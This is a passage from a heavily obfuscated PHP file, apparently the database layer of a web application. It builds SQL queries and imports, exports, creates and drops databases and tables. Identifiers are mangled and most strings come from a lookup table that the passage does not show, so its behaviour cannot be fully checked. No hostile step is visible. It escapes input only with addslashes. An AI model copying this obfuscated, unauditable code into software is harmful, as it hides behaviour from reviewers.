$_SERVER[¦»×‡Ãã]; return !empty($·³—û©) ? $‰Ùû£¯[1112] . $·³—û© : $‰Ùû£¯[12]; } protected function parseComment($ò¥Ä‚¬Ä) { $¢‰¢Éš“ =& $_SERVER[¦»×‡Ãã]; return !empty($ò¥Ä‚¬Ä) ? $¢‰¢Éš“[1113] . $ò¥Ä‚¬Ä . $¢‰¢Éš“[1114] : $¢‰¢Éš“[12]; } protected function parseDistinct($®ÒÄ¿¶‚) { $—şØ°¤» =& $_SERVER[¦»×‡Ãã]; return !empty($®ÒÄ¿¶‚) ? $—şØ°¤»[1115] : $—şØ°¤»[12]; } protected function parseUnion($–¬áõ×Ç) { $ÀÖßè°Ö =& $_SERVER[¦»×‡Ãã]; if (empty($–¬áõ×Ç)) { return $ÀÖßè°Ö[12]; } if (isset($–¬áõ×Ç[$ÀÖßè°Ö[424]])) { $ı†²º·± = $ÀÖßè°Ö[1116]; unset($–¬áõ×Ç[$ÀÖßè°Ö[424]]); } else { $ı†²º·± = $ÀÖßè°Ö[1117]; } foreach ($–¬áõ×Ç as $õ¶¶Åƒä) { $™Õºì¦Ğ[] = $ı†²º·± . (is_array($õ¶¶Åƒä) ? $this->buildSelectSql($õ¶¶Åƒä) : $õ¶¶Åƒä); } return implode($ÀÖßè°Ö[53], $™Õºì¦Ğ); } public function insert($Áô‡Ó†ö, $É´š©ƒ¤ = array(), $à…¸ºÌ = false) { $ÔƒÄ£á =& $_SERVER[¦»×‡Ãã]; $ÕÂ²»çô = $èá¬›º = array(); $this->model = $É´š©ƒ¤[$ÔƒÄ£á[358]]; foreach ($Áô‡Ó†ö as $©šÌ¢¼ => $¸¤£õ«) { if (is_array($¸¤£õ«) && $ÔƒÄ£á[373] == $¸¤£õ«[0]) { $èá¬›º[] = $this->parseKey($©šÌ¢¼); $ÕÂ²»çô[] = $¸¤£õ«[1]; } elseif (is_scalar($¸¤£õ«) || is_null($¸¤£õ«)) { $èá¬›º[] = $this->parseKey($©šÌ¢¼); $ÕÂ²»çô[] = $this->parseValue($¸¤£õ«); } } $ëÆØŸà = ($à…¸ºÌ ? $ÔƒÄ£á[985] : $ÔƒÄ£á[986]) . $ÔƒÄ£á[987] . $this->parseTable($É´š©ƒ¤[$ÔƒÄ£á[356]]) . $ÔƒÄ£á[981] . implode($ÔƒÄ£á[50], $èá¬›º) . $ÔƒÄ£á[982] . implode($ÔƒÄ£á[50], $ÕÂ²»çô) . $ÔƒÄ£á[983]; $ëÆØŸà .= $this->parseLock(isset($É´š©ƒ¤[$ÔƒÄ£á[916]]) ? $É´š©ƒ¤[$ÔƒÄ£á[916]] : !1); $ëÆØŸà .= $this->parseComment(!empty($É´š©ƒ¤[$ÔƒÄ£á[430]]) ? $É´š©ƒ¤[$ÔƒÄ£á[430]] : $ÔƒÄ£á[12]); return $this->execute($ëÆØŸà, $this->parseBind(!empty($É´š©ƒ¤[$ÔƒÄ£á[361]]) ? $É´š©ƒ¤[$ÔƒÄ£á[361]] : array())); } public function selectInsert($ò×±â—Ä, $å¢–ïõİ, $¶ôı¦ÊŠ = array()) { $ªÚÖ¤•› =& $_SERVER[¦»×‡Ãã]; $this->model = $¶ôı¦ÊŠ[$ªÚÖ¤•›[358]]; if (is_string($ò×±â—Ä)) { $ò×±â—Ä = explode($ªÚÖ¤•›[50], $ò×±â—Ä); } array_walk($ò×±â—Ä, array($this, $ªÚÖ¤•›[984])); $şÌñôğÜ = $ªÚÖ¤•›[1118] . $this->parseTable($å¢–ïõİ) . $ªÚÖ¤•›[981] . implode($ªÚÖ¤•›[50], $ò×±â—Ä) . $ªÚÖ¤•›[1096]; $şÌñôğÜ .= $this->buildSelectSql($¶ôı¦ÊŠ); return $this->execute($şÌñôğÜ, $this->parseBind(!empty($¶ôı¦ÊŠ[$ªÚÖ¤•›[361]]) ? $¶ôı¦ÊŠ[$ªÚÖ¤•›[361]] : array())); } public function update($‡¿õü¯ç, $¸ù‚Ï¾²) { $õ÷»Èëà =& $_SERVER[¦»×‡Ãã]; $this->model = $¸ù‚Ï¾²[$õ÷»Èëà[358]]; $Íè§·º¦ = $õ÷»Èëà[1119] . $this->parseTable($¸ù‚Ï¾²[$õ÷»Èëà[356]]) . $this->parseSet($‡¿õü¯ç) . $this->parseWhere(!empty($¸ù‚Ï¾²[$õ÷»Èëà[352]]) ? $¸ù‚Ï¾²[$õ÷»Èëà[352]] : $õ÷»Èëà[12]) . $this->parseOrder(!empty($¸ù‚Ï¾²[$õ÷»Èëà[441]]) ? $¸ù‚Ï¾²[$õ÷»Èëà[441]] : $õ÷»Èëà[12]) . $this->parseLimit(!empty($¸ù‚Ï¾²[$õ÷»Èëà[368]]) ? $¸ù‚Ï¾²[$õ÷»Èëà[368]] : $õ÷»Èëà[12]) . $this->parseLock(isset($¸ù‚Ï¾²[$õ÷»Èëà[916]]) ? $¸ù‚Ï¾²[$õ÷»Èëà[916]] : !1) . $this->parseComment(!empty($¸ù‚Ï¾²[$õ÷»Èëà[430]]) ? $¸ù‚Ï¾²[$õ÷»Èëà[430]] : $õ÷»Èëà[12]); return $this->execute($Íè§·º¦, $this->parseBind(!empty($¸ù‚Ï¾²[$õ÷»Èëà[361]]) ? $¸ù‚Ï¾²[$õ÷»Èëà[361]] : array())); } public function delete($áİ”…¡ = array()) { $ÃÅ¤©Éƒ =& $_SERVER[¦»×‡Ãã]; $this->model = $áİ”…¡[$ÃÅ¤©Éƒ[358]]; $ŞÓê„÷ = $ÃÅ¤©Éƒ[1120] . $this->parseTable($áİ”…¡[$ÃÅ¤©Éƒ[356]]) . $this->parseWhere(!empty($áİ”…¡[$ÃÅ¤©Éƒ[352]]) ? $áİ”…¡[$ÃÅ¤©Éƒ[352]] : $ÃÅ¤©Éƒ[12]) . $this->parseOrder(!empty($áİ”…¡[$ÃÅ¤©Éƒ[441]]) ? $áİ”…¡[$ÃÅ¤©Éƒ[441]] : $ÃÅ¤©Éƒ[12]) . $this->parseLimit(!empty($áİ”…¡[$ÃÅ¤©Éƒ[368]]) ? $áİ”…¡[$ÃÅ¤©Éƒ[368]] : $ÃÅ¤©Éƒ[12]) . $this->parseLock(isset($áİ”…¡[$ÃÅ¤©Éƒ[916]]) ? $áİ”…¡[$ÃÅ¤©Éƒ[916]] : !1) . $this->parseComment(!empty($áİ”…¡[$ÃÅ¤©Éƒ[430]]) ? $áİ”…¡[$ÃÅ¤©Éƒ[430]] : $ÃÅ¤©Éƒ[12]); return $this->execute($ŞÓê„÷, $this->parseBind(!empty($áİ”…¡[$ÃÅ¤©Éƒ[361]]) ? $áİ”…¡[$ÃÅ¤©Éƒ[361]] : array())); } public function select($€øû‚òß = array()) { $Â‘‹ßµ =& $_SERVER[¦»×‡Ãã]; $this->model = $€øû‚òß[$Â‘‹ßµ[358]]; $·ÊöÙå = $this->buildSelectSql($€øû‚òß); $Ï³™Î®ƒ = isset($€øû‚òß[$Â‘‹ßµ[425]]) ? $€øû‚òß[$Â‘‹ßµ[425]] : !1; if ($Ï³™Î®ƒ) { $Õ²Œ•‘¼ = is_string($Ï³™Î®ƒ[$Â‘‹ßµ[97]]) ? $Ï³™Î®ƒ[$Â‘‹ßµ[97]] : $Â‘‹ßµ[1121] . md5($·ÊöÙå); $üÙ¶–Ş = think_cache($Õ²Œ•‘¼, $Â‘‹ßµ[12], $Ï³™Î®ƒ); if (!1 !== $üÙ¶–Ş) { return $üÙ¶–Ş; } } $¥—¤ÔÀ´ = $this->query($·ÊöÙå, $this->parseBind(!empty($€øû‚òß[$Â‘‹ßµ[361]]) ? $€øû‚òß[$Â‘‹ßµ[361]] : array())); if ($Ï³™Î®ƒ && !1 !== $¥—¤ÔÀ´) { think_cache($Õ²Œ•‘¼, $¥—¤ÔÀ´, $Ï³™Î®ƒ); } return $¥—¤ÔÀ´; } public function buildSelectSql($„öã©ü´ = array()) { $ö€²¹šÆ =& $_SERVER[¦»×‡Ãã]; if (isset($„öã©ü´[$ö€²¹šÆ[429]])) { if (strpos($„öã©ü´[$ö€²¹šÆ[429]], $ö€²¹šÆ[50])) { list($¢¯óó¼ê, $üšÚ­ì) = explode($ö€²¹šÆ[50], $„öã©ü´[$ö€²¹šÆ[429]]); } else { $¢¯óó¼ê = $„öã©ü´[$ö€²¹šÆ[429]]; } $¢¯óó¼ê = $¢¯óó¼ê ? $¢¯óó¼ê : 1; $üšÚ­ì = isset($üšÚ­ì) ? $üšÚ­ì : (is_numeric($„öã©ü´[$ö€²¹šÆ[368]]) ? $„öã©ü´[$ö€²¹šÆ[368]] : 20); $òüƒû¹¶ = $üšÚ­ì * ((int) $¢¯óó¼ê - 1); $„öã©ü´[$ö€²¹šÆ[368]] = $òüƒû¹¶ . $ö€²¹šÆ[50] . $üšÚ­ì; } if (think_config($ö€²¹šÆ[1122])) { $É¶¶²öİ = $ö€²¹šÆ[1123] . md5(serialize($„öã©ü´)); $ášŸ‰ÒÉ = think_cache($É¶¶²öİ); if ($ášŸ‰ÒÉ) { return $ášŸ‰ÒÉ; } } $²ûäóê¤ = $this->parseSql($this->selectSql, $„öã©ü´); $²ûäóê¤ .= $this->parseLock(isset($„öã©ü´[$ö€²¹šÆ[916]]) ? $„öã©ü´[$ö€²¹šÆ[916]] : !1); if (isset($É¶¶²öİ)) { think_cache($É¶¶²öİ, $²ûäóê¤); } return $²ûäóê¤; } public function parseSql($Ï°µ‘Õ¼, $ÀÁØÔØ“ = array()) { $üÓÀİÖ¬ =& $_SERVER[¦»×‡Ãã]; $Ï°µ‘Õ¼ = str_replace(array($üÓÀİÖ¬[1124], $üÓÀİÖ¬[1125], $üÓÀİÖ¬[1126], $üÓÀİÖ¬[1127], $üÓÀİÖ¬[1128], $üÓÀİÖ¬[1129], $üÓÀİÖ¬[1130], $üÓÀİÖ¬[1131], $üÓÀİÖ¬[1132], $üÓÀİÖ¬[1133], $üÓÀİÖ¬[1134]), array($this->parseTable("{$ÀÁØÔØ“[$üÓÀİÖ¬[356]]}"), $this->parseDistinct(isset($ÀÁØÔØ“[$üÓÀİÖ¬[1135]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[1135]] : !1), $this->parseField(!empty($ÀÁØÔØ“[$üÓÀİÖ¬[350]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[350]] : $üÓÀİÖ¬[220]), $this->parseJoin(!empty($ÀÁØÔØ“[$üÓÀİÖ¬[359]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[359]] : $üÓÀİÖ¬[12]), $this->parseWhere(!empty($ÀÁØÔØ“[$üÓÀİÖ¬[352]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[352]] : $üÓÀİÖ¬[12]), $this->parseGroup(!empty($ÀÁØÔØ“[$üÓÀİÖ¬[578]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[578]] : $üÓÀİÖ¬[12]), $this->parseHaving(!empty($ÀÁØÔØ“[$üÓÀİÖ¬[1136]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[1136]] : $üÓÀİÖ¬[12]), $this->parseOrder(!empty($ÀÁØÔØ“[$üÓÀİÖ¬[441]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[441]] : $üÓÀİÖ¬[12]), $this->parseLimit(!empty($ÀÁØÔØ“[$üÓÀİÖ¬[368]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[368]] : $üÓÀİÖ¬[12]), $this->parseUnion(!empty($ÀÁØÔØ“[$üÓÀİÖ¬[423]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[423]] : $üÓÀİÖ¬[12]), $this->parseComment(!empty($ÀÁØÔØ“[$üÓÀİÖ¬[430]]) ? $ÀÁØÔØ“[$üÓÀİÖ¬[430]] : $üÓÀİÖ¬[12])), $Ï°µ‘Õ¼); return $Ï°µ‘Õ¼; } public function getLastSql($·è­¢š¦ = '') { return $·è­¢š¦ ? $this->modelSql[$·è­¢š¦] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($“İ»Šõ) { return addslashes($“İ»Šõ); } public function setModel($§Èç¨ñ¹) { $this->model = $§Èç¨ñ¹; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($·óÂˆì› = array()) { $À®£³‹ =& $_SERVER[¦»×‡Ãã]; if (empty($·óÂˆì›)) { $·óÂˆì› = $GLOBALS[$À®£³‹[6]][$À®£³‹[21]]; } $this->database = $·óÂˆì›; } public function model($üëÚ­¾ı = '') { return new ModelBase($üëÚ­¾ı, $_SERVER[¦»×‡Ãã][12], $this->database); } public function db($ĞüÊÚô¼ = false) { $¨ÁÇ¬ç½ =& $_SERVER[¦»×‡Ãã]; $¥””Ğ±Œ = array_change_key_case($this->database); if ($this->dbType() == $¨ÁÇ¬ç½[13] || !$ĞüÊÚô¼) { return $this->model()->db(); } $çà§à£ç = $¥””Ğ±Œ[$¨ÁÇ¬ç½[1050]]; $¥””Ğ±Œ[$¨ÁÇ¬ç½[1050]] = $¨ÁÇ¬ç½[12]; if ($¥””Ğ±Œ[$¨ÁÇ¬ç½[1045]] == $¨ÁÇ¬ç½[1042]) { $£öÒ›´‘ = $¥””Ğ±Œ[$¨ÁÇ¬ç½[1051]]; $¥””Ğ±Œ[$¨ÁÇ¬ç½[1051]] = substr($£öÒ›´‘, 0, strrpos($£öÒ›´‘, $¨ÁÇ¬ç½[1137])); } $this->database = $¥””Ğ±Œ; $Î†şˆˆ¨ = $this->model()->db(); try { $úĞ€¡× = $Î†şˆˆ¨->execute("\x73\x68\x6f\x77\x20\144\141\x74\x61\142\x61\x73\x65\163\x20\x6c\x69\153\145\40\47{$çà§à£ç}\47"); } catch (Exception $…É‚šì©) { } if (!$úĞ€¡×) { $Î†şˆˆ¨->execute("\143\162\145\x61\x74\145\x20\144\x61\x74\x61\142\x61\x73\x65\40\x60{$çà§à£ç}\x60"); } $¥””Ğ±Œ[$¨ÁÇ¬ç½[1050]] = $çà§à£ç; if ($¥””Ğ±Œ[$¨ÁÇ¬ç½[1045]] == $¨ÁÇ¬ç½[1042]) { $¥””Ğ±Œ[$¨ÁÇ¬ç½[1051]] .= $¨ÁÇ¬ç½[1137] . $çà§à£ç; } $this->database = $¥””Ğ±Œ; $Î†şˆˆ¨->execute("\165\163\145\x20\140{$çà§à£ç}\x60"); return $Î†şˆˆ¨; } public function createTable($ÉÇò¹‘ô, &$ÀïÀÑĞÌ) { $ˆû…µ©÷ =& $_SERVER[¦»×‡Ãã]; if (!IO::exist($ÉÇò¹‘ô)) { ActionCall($ˆû…µ©÷[1138], !0, 0); show_json(LNG($ˆû…µ©÷[1139]), !1); } $šÉ£îõ¨ = $this->model()->db(); $ÜåëïÉ‡ = sqlSplit(IO::getContent($ÉÇò¹‘ô)); foreach ($ÜåëïÉ‡ as $Ç¯˜Á™¼) { $ñ–¡çæ = stripos($Ç¯˜Á™¼, $ˆû…µ©÷[1140]) === 0; if ($ñ–¡çæ) { $ÀïÀÑĞÌ->task[$ˆû…µ©÷[1141]] += 1; } $šÉ£îõ¨->execute($Ç¯˜Á™¼); if ($ñ–¡çæ) { preg_match($ˆû…µ©÷[1142], $Ç¯˜Á™¼, $şÈ¾›Ä); $ÀïÀÑĞÌ->task[$ˆû…µ©÷[1143]] = $şÈ¾›Ä[1]; $ÀïÀÑĞÌ->update(1); } } } public function insertTable($Î±”ÒöÖ, &$àŸ½ĞÜ¿) { $ğ†­”ºÓ =& $_SERVER[¦»×‡Ãã]; $£ıÃ‚´Ë = $this->model()->db(); $ÕÑå³ÓÛ = $™ÇÔò´ ? array($™ÇÔò´) : $£ıÃ‚´Ë->getTables(); foreach ($Î±”ÒöÖ as $™è±Ø½Š) { $™ÇÔò´ = basename($™è±Ø½Š, $ğ†­”ºÓ[861]); if (!in_array($™ÇÔò´, $ÕÑå³ÓÛ)) { continue; } $àŸ½ĞÜ¿->task[$ğ†­”ºÓ[1143]] = $™ÇÔò´; if (get_filesize($™è±Ø½Š) == 0) { continue; } $á‘ÈúÍü = $this->sqlToDb($™è±Ø½Š, $àŸ½ĞÜ¿); if (!$á‘ÈúÍü) { ActionCall($ğ†­”ºÓ[1138], !0, 0); show_json(LNG($ğ†­”ºÓ[1144]) . "\x5b{$™ÇÔò´}\x5d", !1); } } } public function sqlFromDb($øŒÙšÈÜ, $é“„­‘, &$€Áœ£¯œ, $æ®û²‚ = '') { if ($€Áœ£¯œ) { $€Áœ£¯œ->task[$_SERVER[¦»×‡Ãã][1143]] = $øŒÙšÈÜ; } $üÕ×†ï± = $this->model($øŒÙšÈÜ); $â¬…§¬œ = 0; $êğÈ¶©Û = 0; $£ûÍ†ÙÈ = 10000; $êÔšßòğ = fopen($é“„­‘, $_SERVER[¦»×‡Ãã][1145]); $ŞŸÒºƒî = $üÕ×†ï±->getPk(); $ò÷¿ú»› = $üÕ×†ï±->getDbFields(); $â§†¦ê‘ = $_SERVER[¦»×‡Ãã][12]; if ($GLOBALS[$_SERVER[¦»×‡Ãã][860]] && in_array($øŒÙšÈÜ, array($_SERVER[¦»×‡Ãã][1146], $_SERVER[¦»×‡Ãã][1147]))) { $â§†¦ê‘ = $øŒÙšÈÜ; } do { $›úù„¤ö = array($ŞŸÒºƒî => array($_SERVER[¦»×‡Ãã][1092], $êğÈ¶©Û)); $ÅÀò— = $üÕ×†ï±->where($›úù„¤ö)->field($ò÷¿ú»›)->order($ŞŸÒºƒî . $_SERVER[¦»×‡Ãã][1148])->limit($£ûÍ†ÙÈ)->select(); $ÅÀò— = !empty($ÅÀò—) ? $ÅÀò— : array(); if (!($Æ°÷ÎÕ = count($ÅÀò—))) { break; } $ÑšÜú“² = end($ÅÀò—); $êğÈ¶©Û = $ÑšÜú“²[$ŞŸÒºƒî]; $Õ¾ùï¡ = array(); foreach ($ÅÀò— as $¢ğ„ìÉŠ) { if ($â§†¦ê‘) { if ($øŒÙšÈÜ == $_SERVER[¦»×‡Ãã][1146]) { if ($¢ğ„ìÉŠ[$_SERVER[¦»×‡Ãã][33]] == $_SERVER[¦»×‡Ãã][1149]) { $Ù °áü× = json_decode($¢ğ„ìÉŠ[$_SERVER[¦»×‡Ãã][450]], !0); if ($Ù °áü×[$_SERVER[¦»×‡Ãã][32]] == $GLOBALS[$_SERVER[¦»×‡Ãã][860]] && $Ù °áü×[$_SERVER[¦»×‡Ãã][823]] != 1) { continue; } } } else { if ($¢ğ„ìÉŠ[$_SERVER[¦»×‡Ãã][33]] == $_SERVER[¦»×‡Ãã][1150] && $¢ğ„ìÉŠ[$_SERVER[¦»×‡Ãã][97]] == $_SERVER[¦»×‡Ãã][855]) { continue; } } } if ($æ®û²‚) { $¢ğ„ìÉŠ[$_SERVER[¦»×‡Ãã][87]] = "\x7b\x69\157\x3a{$æ®û²‚}\x7d" . substr($¢ğ„ìÉŠ[$_SERVER[¦»×‡Ãã][87]], strlen("\173\x69\x6f\x3a{$¢ğ„ìÉŠ[$_SERVER[¦»×‡Ãã][890]]}\x7d")); $¢ğ„ìÉŠ[$_SERVER[¦»×‡Ãã][890]] = $æ®û²‚; } $Õ¾ùï¡[] = $_SERVER[¦»×‡Ãã][1151] . $this->sqlEncode($¢ğ„ìÉŠ) . $_SERVER[¦»×‡Ãã][1152]; } $±û‘İ”ø = "\111\116\123\105\122\124\40\x49\x4e\x54\x4f\40\x60{$øŒÙšÈÜ}\x60\40\50\140" . implode($_SERVER[¦»×‡Ãã][1153], $ò÷¿ú»›) . $_SERVER[¦»×‡Ãã][1154]; fwrite($êÔšßòğ, $±û‘İ”ø . implode($_SERVER[¦»×‡Ãã][1155], $Õ¾ùï¡) . $_SERVER[¦»×‡Ãã][74] . PHP_EOL); $â¬…§¬œ += $Æ°÷ÎÕ; if ($€Áœ£¯œ) { $€Áœ£¯œ->update($Æ°÷ÎÕ); } } while ($£ûÍ†ÙÈ == $Æ°÷ÎÕ); fclose($êÔšßòğ); return $â¬…§¬œ; } public function sqlToDb($î¿¾‰£®, &$õ„Ù¯Åå) { $®‘íôŠï =& $_SERVER[¦»×‡Ãã]; $‡‚‚î¼ = $this->model()->db(); $Êåää†Ò = @fopen($î¿¾‰£®, $®‘íôŠï[1156]); if (!$Êåää†Ò) { return !1; } $ªŠù°›Š = 0; $œëå±¤Ê = $®‘íôŠï[12]; $…–¬— » = array(); $ÔÈïøáØ = $this->dbType(); $Íõµ÷ÅĞ = $ÔÈïøáØ == $®‘íôŠï[13] ? 500 : 2000; $«¨×ŠÎ˜ = basename($î¿¾‰£®, $®‘íôŠï[861]); $œ›¼•Ÿ­ = 0; $ Ó‘Íõ = 4194304; while (!feof($Êåää†Ò)) { $ƒ¸Ÿ§­ = trim(fgets($Êåää†Ò)); if (!$ƒ¸Ÿ§­) { continue; } $‘¨›‡îà = $this->sqlDecode($ƒ¸Ÿ§­, $ÔÈïøáØ, $«¨×ŠÎ˜); if (stripos($‘¨›‡îà, $®‘íôŠï[431]) === 0) { if (!$œëå±¤Ê) { $œëå±¤Ê = $‘¨›‡îà . $®‘íôŠï[53]; } continue; } if ($õ„Ù¯Åå) { $õ„Ù¯Åå->task[$®‘íôŠï[1141]] += 1; } $ªŠù°›Š++; $…–¬— »[] = rtrim(rtrim(trim($‘¨›‡îà), $®‘íôŠï[50]), $®‘íôŠï[74]); $ÕİóÁë« = null; $¡š¶Çê = strlen($‘¨›‡îà); $œ›¼•Ÿ­ += $¡š¶Çê; $“èìíˆ = strlen($œëå±¤Ê) + $œ›¼•Ÿ­ + (count($…–¬— ») - 1); if ($“èìíˆ >= $ Ó‘Íõ) { $ÕİóÁë« = array_pop($…–¬— »); if ($ªŠù°›Š > 1) { $ªŠù°›Š--; } } if ($ªŠù°›Š >= $Íõµ÷ÅĞ || $ÕİóÁë«) { $‘¨›‡îà = $œëå±¤Ê . implode($®‘íôŠï[50], $…–¬— »); if (!$‡‚‚î¼->execute($‘¨›‡îà)) { return !1; } if ($õ„Ù¯Åå) { $õ„Ù¯Åå->update($ªŠù°›Š); } $…–¬— » = array(); $ªŠù°›Š = 0; $œ›¼•Ÿ­ = 0; if ($ÕİóÁë«) { $…–¬— » = array($ÕİóÁë«); $ªŠù°›Š = 1; $œ›¼•Ÿ­ = $¡š¶Çê; } } } fclose($Êåää†Ò); if (!empty($…–¬— »)) { $‘¨›‡îà = $œëå±¤Ê . implode($®‘íôŠï[50], $…–¬— »); if (!$‡‚‚î¼->execute($‘¨›‡îà)) { return !1; } if ($õ„Ù¯Åå) { $õ„Ù¯Åå->update($ªŠù°›Š); } } return !0; } public function dropTable($ƒÃûğ–à = null) { $åğÎ†ÄÙ = $this->model()->db(); $Ó–ë¬ÊÈ = $ƒÃûğ–à ? array($ƒÃûğ–à) : $åğÎ†ÄÙ->getTables(); if (!$Ó–ë¬ÊÈ) { return; } foreach ($Ó–ë¬ÊÈ as $ƒÃûğ–à) { if ($ƒÃûğ–à) { $ƒÃûğ–à = strtolower($ƒÃûğ–à); } else { continue; } $åğÎ†ÄÙ->execute("\144\x72\157\x70\x20\164\x61\x62\154\x65\40\151\146\40\145\x78\x69\163\164\x73\x20\140{$ƒÃûğ–à}\140"); } } private function sqlEncode($¾å†¨§¥) { $Õ¹ÇÁ¬ =& $_SERVER[¦»×‡Ãã]; $Ö±œ¶şá = array(); foreach ($¾å†¨§¥ as $§­‡ø) { if (is_array($§­‡ø)) { $§­‡ø = json_encode_force($§­‡ø); } $§­‡ø = addslashes($§­‡ø); $§­‡ø = str_replace(array($Õ¹ÇÁ¬[1157], $Õ¹ÇÁ¬[262], $Õ¹ÇÁ¬[418]), array($Õ¹ÇÁ¬[1158], $Õ¹ÇÁ¬[1159], $Õ¹ÇÁ¬[1160]), $§­‡ø); $Ö±œ¶şá[] = $§­‡ø; } return $Õ¹ÇÁ¬[58] . implode($Õ¹ÇÁ¬[1161], $Ö±œ¶şá) . $Õ¹ÇÁ¬[58]; } private function sqlDecode($¸ä«èïÇ, $öµóºŸù, $ÃùëËô = '') { $³‡ÁÉ¦Ô =& $_SERVER[¦»×‡Ãã]; $¸ä«èïÇ = str_replace(array($³‡ÁÉ¦Ô[1158], $³‡ÁÉ¦Ô[1159], $³‡ÁÉ¦Ô[1160]), array($³‡ÁÉ¦Ô[1157], $³‡ÁÉ¦Ô[262], $³‡ÁÉ¦Ô[418]), $¸ä«èïÇ); if ($öµóºŸù == $³‡ÁÉ¦Ô[13]) { $¸ä«èïÇ = str_ireplace($³‡ÁÉ¦Ô[1162], $³‡ÁÉ¦Ô[59], $¸ä«èïÇ); $¸ä«èïÇ = stripslashes($¸ä«èïÇ); } return preg_replace($³‡ÁÉ¦Ô[1163], $³‡ÁÉ¦Ô[12], $¸ä«èïÇ); if ($öµóºŸù == $³‡ÁÉ¦Ô[13]) { return $ÃùëËô != $³‡ÁÉ¦Ô[1164] ? stripslashes($¸ä«èïÇ) : $¸ä«èïÇ; } if ($ÃùëËô == $³‡ÁÉ¦Ô[1164]) { $¸ä«èïÇ = str_replace($³‡ÁÉ¦Ô[1165], $³‡ÁÉ¦Ô[121], stripslashes($¸ä«èïÇ)); } return $¸ä«èïÇ; } public function getSqlFile($»â‘É = '') { $ãı”Š¢ß =& $_SERVER[¦»×‡Ãã]; $Õ–¶ÊŠ» = $this->dbType(!0); $¬ŞÒ¥Ò¹ = CONTROLLER_DIR . "\x69\156\x73\x74\141\x6c\154\57\144\141\x74\141\57{$Õ–¶ÊŠ»}\x2e\163\x71\154"; $Ô¬ÜÅ¸½ = file_get_contents($¬ŞÒ¥Ò¹); $ÖŸ›öá = $ãı”Š¢ß[1166] . ($Õ–¶ÊŠ» == $ãı”Š¢ß[877] ? $ãı”Š¢ß[1167] : $ãı”Š¢ß[1168]) . $ãı”Š¢ß[1169]; preg_match_all($ÖŸ›öá, $Ô¬ÜÅ¸½, $‚²Š¤… ); $æä»ÂûŠ = $‚²Š¤… [1]; $…¹ˆ­¥½ = $this->model()->db(); $ÓŸ£ƒ‘ = $…¹ˆ­¥½->getTables(); $ĞªğÃôº = TEMP_FILES . $ãı”Š¢ß[1170] . date($ãı”Š¢ß[272]) . $ãı”Š¢ß[8]; del_dir($ĞªğÃôº); mk_dir($ĞªğÃôº); $ûœª­® = $ĞªğÃôº . $ãı”Š¢ß[1171]; $›‰Ü›«ú = $ĞªğÃôº . $ãı”Š¢ß[1172]; $ì²ÁæÌ = $Õ–¶ÊŠ» == $ãı”Š¢ß[13] ? $ãı”Š¢ß[877] : $ãı”Š¢ß[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\141\x6c\154\57\144\x61\x74\x61\x2f{$ì²ÁæÌ}\x2e\x73\161\x6c", $ĞªğÃôº); @touch($ĞªğÃôº . $Õ–¶ÊŠ» . $ãı”Š¢ß[861]); $«Ñ’Áõ = fopen($ûœª­®, $ãı”Š¢ß[1145]); $¿Êâ ‹” = fopen($›‰Ü›«ú, $ãı”Š¢ß[1145]); if ($Õ–¶ÊŠ» == $ãı”Š¢ß[13]) { $ÓŸ£ƒ‘ = array_diff($ÓŸ£ƒ‘, array($ãı”Š¢ß[853], $ãı”Š¢ß[854])); $áğ™õÖ = array($ãı”Š¢ß[1173], $ãı”Š¢ß[1174], $ãı”Š¢ß[1175]); fwrite($¿Êâ ‹”, implode(PHP_EOL, $áğ™õÖ) . PHP_EOL . PHP_EOL); foreach ($ÓŸ£ƒ‘ as $¡êáëÃ) { $…Ê­¾İ = $this->sqlFromSqlite($¡êáëÃ); if (!$…Ê­¾İ[$ãı”Š¢ß[13]]) { continue; } fwrite($¿Êâ ‹”, $…Ê­¾İ[$ãı”Š¢ß[13]] . PHP_EOL . PHP_EOL); if (!in_array($¡êáëÃ, $æä»ÂûŠ)) { fwrite($«Ñ’Áõ, $…Ê­¾İ[$ãı”Š¢ß[877]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÓŸ£ƒ‘ as $¡êáëÃ) { $…Ê­¾İ = $this->sqlFromMysql($¡êáëÃ); if (!$…Ê­¾İ[$ãı”Š¢ß[877]]) { continue; } fwrite($«Ñ’Áõ, $…Ê­¾İ[$ãı”Š¢ß[877]] . PHP_EOL . PHP_EOL); if (!in_array($¡êáëÃ, $æä»ÂûŠ)) { fwrite($¿Êâ ‹”, $…Ê­¾İ[$ãı”Š¢ß[13]] . PHP_EOL . PHP_EOL); } } } fclose($«Ñ’Áõ); fclose($¿Êâ ‹”); $Ô¬ÜÅ¸½ = array($ãı”Š¢ß[877] => $ûœª­®, $ãı”Š¢ß[13] => $›‰Ü›«ú); return $»â‘É ? $Ô¬ÜÅ¸½[$»â‘É] : $Ô¬ÜÅ¸½; } public function dbType($ï†±ç¾ = false) { $°á·³Äß =& $_SERVER[¦»×‡Ãã]; $õ€¥¨ƒ = $ï†±ç¾ ? $GLOBALS[$°á·³Äß[6]][$°á·³Äß[21]] : $this->database; $õ€¥¨ƒ = array_change_key_case($õ€¥¨ƒ); $€Èí±» = $õ€¥¨ƒ[$°á·³Äß[1045]]; if ($€Èí±» == $°á·³Äß[1042]) { $€—‚Èúç = explode($°á·³Äß[4], $õ€¥¨ƒ[$°á·³Äß[1051]]); $€Èí±» = $€—‚Èúç[0]; } $¼€Í¨Ç = array($°á·³Äß[1176] => $°á·³Äß[13], $°á·³Äß[990] => $°á·³Äß[877]); if (isset($¼€Í¨Ç[$€Èí±»])) { $€Èí±» = $¼€Í¨Ç[$€Èí±»]; } return $€Èí±»; } public function sqlFromMysql($¬€ã©Øé, $„®­ÈÛó = '') { $õŞ»ÕùË =& $_SERVER[¦»×‡Ãã]; $İÇˆÀ¤Æ = $this->model()->db(); $úö·‡Ìš = $İÇˆÀ¤Æ->query($õŞ»ÕùË[1177] . $¬€ã©Øé . $õŞ»ÕùË[461]); if 